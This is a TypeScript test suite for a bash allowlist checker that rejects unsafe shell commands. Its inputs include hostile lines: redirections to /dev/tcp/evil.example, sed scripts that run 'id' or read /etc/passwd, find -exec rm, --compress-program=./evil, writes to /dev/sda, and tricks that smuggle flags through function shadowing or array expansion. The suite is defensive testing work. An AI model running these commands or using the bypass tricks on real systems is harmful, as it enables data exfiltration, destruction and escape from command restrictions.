import { test } from "node:test";
import assert from "node:assert/strict";
import { checkBashCommands, sedScriptAllowed } from "../src/bash/allowlist.ts";

function assertClean(code: string, allowlist?: Parameters<typeof checkBashCommands>[1]): void {
  assert.deepEqual(checkBashCommands(code, allowlist), []);
}

function assertRejected(code: string, fragment: string, allowlist?: Parameters<typeof checkBashCommands>[1]): void {
  const violations = checkBashCommands(code, allowlist);
  assert.ok(
    violations.some((v) => v.kind === "not-whitelisted" && v.message.includes(fragment)),
    `expected "${fragment}" for: ${code}\ngot ${JSON.stringify(violations)}`,
  );
}

test("commands on the default allowlist are accepted", () => {
  assertClean(`set -euo pipefail
mkdir -p ./out
for f in a b; do echo "$f" | grep -c x; done
cat ./in.txt | sort | uniq -c > ./out/counts.txt
cp -r ./a ./b
find . -name '*.txt' -delete
sed -i 's/a/b/g' ./out/counts.txt
x=$(ls -1 ./out)
echo "$x" 2>/dev/null
`);
});

test("a command off the allowlist is rejected with its position", () => {
  const violations = checkBashCommands("echo ok\ncurl https://example.com\n");
  assert.equal(violations.length, 1);
  assert.equal(violations[0]!.kind, "not-whitelisted");
  assert.match(violations[0]!.message, /curl/);
  assert.equal(violations[0]!.line, 2);
  assert.equal(violations[0]!.column, 1);
});

test("a path to a program is not on the allowlist", () => {
  assertRejected("./run.sh", "./run.sh");
  assertRejected("/bin/rm -rf ./x", "/bin/rm");
});

test("commands inside $(...) meet the allowlist", () => {
  assertRejected('x="$(wget -qO- https://e.example)"', "wget");
});

test("a function defined in the script may be called", () => {
  assertClean("greet() { echo hi; }\ngreet\n");
});

test("shells and interpreters stay off even an app's own allowlist", () => {
  const allowlist = { commands: { bash: {}, python3: {}, node: {}, cat: {} } };
  assertRejected("bash <<'EOF'\nls\nEOF\n", "interpreter", allowlist);
  assertRejected("echo ls | python3", "interpreter", allowlist);
  assertRejected("node ./x.js", "interpreter", allowlist);
  assertClean("cat ./x", allowlist);
});

test("an app's allowlist replaces the default", () => {
  const allowlist = { commands: { jq: {} } };
  assertClean("jq . ./a.json", allowlist);
  assertRejected("cat ./a.json", "cat", allowlist);
});

test("denied flags are rejected per command", () => {
  assertRejected("find . -exec rm {} \;", "-exec");
  assertRejected("find . -execdir ls \;", "-execdir");
  assertRejected("find . -ok rm {} \;", "-ok");
  assertRejected("tail -f ./log", "-f");
  assertRejected("tail -nf ./log", "-f");
  assertRejected("tail --follow=name ./log", "--follow");
  assertRejected("sort --compress-program=gzip ./a", "--compress-program");
  assertClean("tail -n 5 ./log");
  assertClean("sort -o ./b ./a");
});

test("an abbreviated long option matches the flag it abbreviates", () => {
  assertRejected("tail --foll ./log", "--follow");
  assertRejected("sort --compress-p=x ./a", "--compress-program");
});

test("an expansion passed to a command with flag rules must follow a literal --", () => {
  assertRejected('tail "$opt" ./log', "--");
  assertClean('tail -n 5 -- "$file"');
  assertRejected('sort "$(printf -- -x)"', "--");
  // A command with no flag rules has no flag that runs anything.
  assertClean('grep -c x "$file"');
  assertClean('echo "$x"');
});

test("a find argument holding an expansion must be a primary's operand or start as a path", () => {
  assertRejected('find "$dir" -name x', "find");
  assertRejected('find . "$expr"', "find");
  assertClean('find "./$dir" -name "$pat"');
  assertClean('find . -name "$pat" -type f');
});

test("a sed script must be a literal made of s///, d and p", () => {
  assertClean("sed 's/a/b/' ./f");
  assertClean("sed -n '/x/p' ./f");
  assertClean("sed -e 's/a/b/g' -e '3d' ./f");
  assertClean("sed 's|a|b|g; /^#/d' ./f");
  assertRejected("sed 's/a/id/e' ./f", "sed");
  assertRejected("sed '1e id' ./f", "sed");
  assertRejected("sed 'w /tmp/x' ./f", "sed");
  assertRejected("sed 's/a/b/w /tmp/x' ./f", "sed");
  assertRejected('sed "$script" ./f', "sed");
  assertRejected("sed -f ./script.sed ./f", "-f");
  assertRejected("sed --expression='1e id' ./f", "sed");
  assertRejected("sed -E 'r /etc/passwd' ./f", "sed");
});

test("a redirection under /dev/ other than /dev/null is rejected", () => {
  assertRejected("echo hi > /dev/tcp/evil.example/80", "/dev/");
  assertRejected("cat < /dev/udp/evil.example/53", "/dev/");
  assertRejected("echo hi >> /dev/sda", "/dev/");
  assertRejected("echo hi &> /dev/tcp/e.example/80", "/dev/");
  assertRejected("echo hi >& /dev/tcp/e.example/80", "/dev/");
  assertRejected("echo hi > '/dev/tcp/e.example/80'", "/dev/");
  assertClean("echo hi > /dev/null 2>&1");
  assertClean("cat < /dev/null >&2");
  assertClean("echo hi > ./dev/out");
});

test("an expanded redirection target needs a literal prefix outside /dev/", () => {
  assertRejected('echo hi > "$out"', "redirection");
  assertRejected('echo hi > "/dev$x"', "redirection");
  assertRejected('echo hi > "/de$x"', "redirection");
  assertRejected('echo hi > "/$x"', "redirection");
  assertRejected('echo hi > "//dev/$x"', "redirection");
  assertRejected('echo hi > ~/"$x"', "redirection");
  assertRejected('echo hi >& "$x"', "redirection");
  assertClean('echo hi > "./out/$name"');
  assertClean('echo hi > "/tmp/$name"');
  assertClean('echo hi > "out-$name.txt"');
});

test("a violation's column counts from the start of its own line", () => {
  assert.deepEqual(
    checkBashCommands("echo ok; curl x\n  wget y\n").map((v) => [v.line, v.column]),
    [[1, 10], [2, 3]],
  );
});

test("a versioned interpreter name is still an interpreter", () => {
  const allowlist = { commands: { "tclsh8.6": {}, "julia1.10": {}, "julia0.7": {} } };
  for (const name of Object.keys(allowlist.commands)) assertRejected(`${name} ./x`, "interpreter", allowlist);
});

test("an app's denied words make an expansion need a literal --", () => {
  assertRejected('tool "$x"', "--", { commands: { tool: { denyWords: ["--run"] } } });
});

test("a long option is matched only by its own abbreviations", () => {
  assertRejected("tail --f ./log", "--follow");
  assertClean("tail --lines=5 ./log");
  assertClean("tool --=x", { commands: { tool: { denyLong: ["--run"] } } });
});

test("a flag-like literal start needs the -- rule", () => {
  assertRejected('tail "-$n" ./log', "--");
});

test("sed options that take an argument and those that do not", () => {
  assertRejected("sed -- '1e id' ./f", "sed");
  assertClean("sed -n -- 's/a/b/p' ./f");
  assertClean("sed --posix -e 's/a/b/' ./f");
  assertClean("sed --e='s/a/b/' ./f");
  assertRejected("sed --expression '1e id'", "sed");
  assertRejected("sed --posix '1e id'", "sed");
  assertClean("sed --l 5 's/a/b/' ./f");
  assertRejected("sed - 's/a/b/'", "sed");
  assertRejected("sed -e '1d' -e '1e id' ./f", "sed");
  assertRejected("sed -e '1e id' ./f", "sed");
  assertRejected("sed -e '1e id'", "sed");
  assertClean("sed -l 5 's/a/b/' ./f");
  assertClean("sed -e's/a/b/' ./f");
  assertClean("sed --=x 's/a/b/' ./f");
});

test("sed script grammar", () => {
  for (const ok of ["10d", "0,/x/d", "1,5d", "s/a/b/2", "s/a/b/; ", "s#a#b#g", "/x/I!d", "$p"]) {
    assert.equal(sedScriptAllowed(ok), true, ok);
  }
  for (const bad of ["s/a/b", "s/a\n", "1,d", "/x", "sxaxbx", "s", "\\%x%d", "s/a/b/w ./o", "y/a/b/"]) {
    assert.equal(sedScriptAllowed(bad), false, bad);
  }
});

test("heredoc and here-string words are text, not paths", () => {
  assertClean('cat <<< "$x"');
  assertClean("cat <<< /dev/tcp/e.example/80");
  assertClean("cat <<'/dev/tcp'\nx\n/dev/tcp\n");
  assertClean("cat <<-'/dev/tcp'\n\tx\n/dev/tcp\n");
});

test("redirection targets that reach /dev/ indirectly", () => {
  assertRejected("echo hi > /./dev/tcp/e.example/80", "/dev/");
  assertRejected('echo hi > "/dev/$x"', "redirection");
  assertRejected('echo hi > /de*"$x"', "redirection");
  assertRejected('echo hi > *"$x"', "redirection");
  assertClean('echo hi > ./out/"$name"');
  assertClean("echo hi > ./out/$name");
  assertClean("echo hi > ./out/$(date)");
  assertClean("echo hi > ./out/$((1 + 2))");
});

test("a function name skips the allowlist only after an unconditional top-level definition", () => {
  assertRejected("( curl() { :; } )\ncurl -o ./x https://e.example\n", "curl");
  assertRejected("tar -cf ./a.tar ./f\ntar() { :; }\n", "tar");
  assertRejected("if false; then nc() { :; }; fi\nnc e.example 80\n", "nc");
  assertRejected("g() { curl() { :; }; }\ncurl https://e.example\n", "curl");
  assertRejected("curl() { :; } &\ncurl https://e.example\n", "curl");
  assertClean("curl() { :; }\ncurl https://e.example\n( curl x )\n");
});

test("unset may not remove a function", () => {
  assertRejected("curl() { :; }\nunset -f curl\ncurl https://e.example\n", "unset");
  assertRejected("curl() { :; }\nunset curl\n", "unset");
  assertRejected('curl() { :; }\nunset "$name"\n', "unset");
  assertRejected("unset -nf x\n", "unset");
  assertClean("curl() { :; }\nunset -v curl\nunset x\n");
  assertClean('unset "$name"\n');
});

test("a -- that is an option's argument does not end the options", () => {
  assertRejected("sort -o -- --compress-program=./evil -S 1k ./big", "compress-program");
  assertRejected("sort -T -- --compress-program=./evil ./big", "compress-program");
  assertRejected("sort --output -- --compress-program=./evil ./big", "compress-program");
  assertRejected("sed -l -- -f ./s.sed -e p ./f", "-f");
  assertRejected('sort -o -- "$x" ./big', "--");
  assertClean('sort -r -- "$x"');
  assertClean('sort -o./out -- "$x"');
  assertClean('sort --reverse -- "$x"');
  assertClean('sort --output=./out -- "$x"');
  assertClean('tail -n5 -- "$x"');
});

test("an app's command without declared argument options never ends its options at a --", () => {
  const allowlist = { commands: { tool: { denyLong: ["--run"] } } };
  assertRejected("tool -q -- --run=x", "--run", allowlist);
  assertRejected("tool --quiet -- --run=x", "--run", allowlist);
  assertClean('tool ./a -- "$x"', allowlist);
  assertClean("tool -- ./x", allowlist);
});

test("find's arguments are walked as primaries and their operands", () => {
  assertRejected('find . -maxdepth 0 -printf -printf "$a" id \;', "find");
  assertRejected('find . -name -name "$a"', "find");
  assertRejected('find . -fprintf ./o -name "$a"', "find");
  assertRejected('find -D -name "$a" .', "find");
  assertRejected('find . -newermt -name "$a"', "find");
  assertClean('find . -fprintf ./o "$fmt" -newermt "$d" -name "$pat"');
  assertClean('find . -name "$pat" -o -path "$p" -print');
});

test("a / inside a bracket expression does not close a sed regex", () => {
  for (const ok of ["s/[/]/X/", "/[/]/d", "s/[]/]/X/", "s/[^]/]/X/", "s/[[:alpha:]/]/X/g"]) {
    assert.equal(sedScriptAllowed(ok), true, ok);
  }
  for (const bad of ["s/[/]/X/e", "/[/]/e id", "s/[/]/;s|/e;s|x|g;s|a|b|", "s/[a/"]) {
    assert.equal(sedScriptAllowed(bad), false, bad);
  }
});

test("a function name bash would refuse to define does not skip the allowlist", () => {
  assertRejected("./ru\\n() { :; }\nprintf x > './ru\\n'\n'./ru\\n'\n", "not on the allowlist");
  assertRejected("cu\\rl() { :; }\n'cu\\rl' x\n", "not on the allowlist");
  assertClean("_greet2() { echo hi; }\n_greet2\n");
});

test("tail's obsolete +N form may not follow the file", () => {
  assertRejected("tail +1f ./in.txt", "tail +f");
  assertRejected("tail +5F ./in.txt", "tail +F");
  assertRejected('tail +1"$x" ./in.txt', "expansion");
  assertClean("tail +5 ./in.txt");
  assertClean("tail -n +5 ./in.txt");
});

test("date takes only +FORMAT operands, so it cannot set the clock", () => {
  assertRejected("date 010100002030", "date takes only operands starting with +");
  assertRejected("date -u 010100002030", "date takes only operands starting with +");
  assertRejected("date -- 010100002030", "date takes only operands starting with +");
  assertRejected('date -- 0"$x"', "date takes only operands starting with +");
  assertRejected('date 0"$x"', "date takes only operands starting with +");
  assertClean("date +%s");
  assertClean('date -u -d @0 "+%Y $x"');
  assertClean("date -- +%s");
  assertClean("date");
});

test("diff may not page through pr", () => {
  assertRejected("diff -l ./a ./b", "diff -l");
  assertRejected("diff --pag ./a ./b", "diff --paginate");
  assertClean("diff -u ./a ./b");
});

test("find's -O level takes no operand and may be 0", () => {
  assertClean("find -O0 . -name x");
  assertClean("find -O3 . -name x");
  assertRejected('find -O3 "$x"', "expansion given to find");
});

test("an unknown find primary is reported and the walk goes on", () => {
  assert.equal(checkBashCommands('find . -bogus "$x"').length, 2);
  assertClean("find ./src -name x");
  // GNU find reads a lone - as a starting path, not as a primary.
  assertClean("find - -name x");
});

test("a -- ends the options only where it cannot be an option's argument", () => {
  assertClean('sort -- "$x"');
  assertClean('sort -o -- -- "$x"');
  assertRejected('sort --o -- "$x"', "expansion");
});

test("unset of a plain variable is allowed", () => {
  assertClean("unset foo");
});

test("a newline inside a sed bracket expression ends the script as invalid", () => {
  assert.equal(sedScriptAllowed("/[a/d\n/]/d"), false);
});

test("sed character classes, unterminated regexes and a [ in a replacement", () => {
  for (const ok of ["s/[a:b]/X/", "s/[[::]x]/Y/", "s/[[:alpha:]]/X/", "s/a/[/"]) {
    assert.equal(sedScriptAllowed(ok), true, ok);
  }
  for (const bad of ["s/[[:a]/X/", "s/[[:]/X/]/Y/", "/abc"]) {
    assert.equal(sedScriptAllowed(bad), false, bad);
  }
});

test("a sed operand before the first -e is a script when getopt stops at the first operand", () => {
  assertRejected("sed 'e touch /tmp/x' -e p ./x", "sed script");
  assertRejected("sed 'e touch /tmp/x' --expression=p ./x", "sed script");
  assertRejected("sed -n '1e id' -e p ./x", "sed script");
  assertClean("sed -n 's/a/b/p' -e p ./x");
  assertClean("sed -e p ./x ./y");
  assertClean("sed -e p -- ./x");
});

test("interpreter families, versioned names and the remaining shells stay off an app's allowlist", () => {
  const names = [
    "zsh-5.9", "bash-5.2", "ruby-3.2", "python3.12", "python3-dbg", "luajit", "lua5.4", "php-cgi",
    "php8.2", "perl5.36", "perldoc", "fish", "tcsh", "csh", "yash", "toybox", "ts-node", "tclsh8.6",
  ];
  const allowlist = { commands: Object.fromEntries(names.map((n) => [n, {}])) };
  for (const name of names) assertRejected(`${name} ./x`, "interpreter", allowlist);
  assertClean("rubocop-free ./x", { commands: { "rubocop-free": {} } });
});

test("an expansion as an option's argument is rejected with advice that can work", () => {
  const violations = checkBashCommands('tail -n "$n" ./f');
  assert.equal(violations.length, 1);
  assert.doesNotMatch(violations[0]!.message, /literal --/);
  assert.match(violations[0]!.message, /argument/);
});

test("hostname is off the default allowlist, since it can set the host name", () => {
  assertRejected("hostname ./name", "not on the allowlist");
});

test("zcat and gunzip are off the default allowlist, since gzip 1.6-1.12 ships them as scripts whose --__bindir puts a script-chosen directory first on PATH", () => {
  assertRejected("zcat --__bindir ./d ./x.gz", "not on the allowlist");
  assertRejected("gunzip --__bindir ./d ./x.gz", "not on the allowlist");
  assertClean("gzip -dc ./x.gz");
});

test("an expansion that splits into several words reaches a command with rules only after a literal --", () => {
  assertRejected(`a=(x '--expression=e id'); sed -n -e p "./\${a[@]}"`, "several words");
  assertRejected(`f() { sed 's/a/b/' "./$@"; }\nf x -e 'e id'`, "several words");
  assertRejected(`a=(x -f); tail "./\${a[@]}"`, "several words");
  assertRejected(`a=(x -f); tail "./\${!a[@]}"`, "several words");
  assertRejected(`a=(out --compress-program=./evil -S 1k); sort -o "./\${a[@]}" ./in`, "option's argument");
  assertRejected(`a=(x 010100002030); date -- "+\${a[@]}"`, "several words");
  assertClean(`a=(x y); sed -n -e p -- "./\${a[@]}"`);
  assertClean(`a=(x y); tail -- "./\${a[@]}"`);
  assertClean(`tail "./$(printf %s "$@")"`);
  assertClean(`sed -i 's/a/b/' ./*.txt`);
});

test("find takes no splitting expansion in a primary's operand and no stray word in a primary's place", () => {
  assertRejected("find ./+exec -maxdepth 0 -name [+-]exec id ';'", "several words");
  assertRejected("find ./+exec -maxdepth 0 -name x id ';'", "not a primary");
  assertRejected(`f() { find . -maxdepth 0 -name "$@"; }\nf x -o -exec id ';'`, "several words");
  assertRejected(`a=(x -exec id ';'); find "./\${a[@]}"`, "several words");
  assertRejected(`find . -name x "./$y"`, "not a primary");
  assertClean("find -L ./a ./b -name x");
  assertClean("find ./src* -name x");
});

test("an app's denied letters hold when it also denies words", () => {
  const allowlist = { commands: { git: { denyShort: "c", denyWords: ["clone", "fetch"] } } };
  assertRejected("git -c core.pager=id log", "git -c", allowlist);
  assertRejected("git clone ./x", "git clone", allowlist);
});
